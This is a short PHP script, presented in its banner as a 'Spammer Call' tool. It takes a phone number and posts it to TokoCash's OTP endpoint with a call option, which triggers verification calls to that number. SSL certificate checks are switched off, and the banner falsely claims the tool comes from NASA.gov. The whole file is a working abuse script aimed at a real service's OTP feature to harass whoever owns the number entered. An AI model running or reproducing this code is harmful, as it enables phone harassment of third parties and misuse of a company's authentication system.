<?php
// hay tayo
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
        curl_close($ch);
                echo $asw."\n";
}
echo "
############################################################
    Spammer Call From NASA.gov
        dibuat oleh : ANDIKA WAHYU DAN MUHAMMAD ILHAM IRVIAN
        school      : SMK MEDIAINFORMATIKA
        Website     : http://ilhamirvian.dx.am
        instagram   : @irvianofficial dan @lesotole
        BUCIN       : hanya mengutamakan tiga kata dengan sejuta arti yaitu bahagia dan bersama. I LOVE YOU SAYANG :)
###########################################################\n";
echo "Nomor\nInput : ";
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
print $execute;
?>
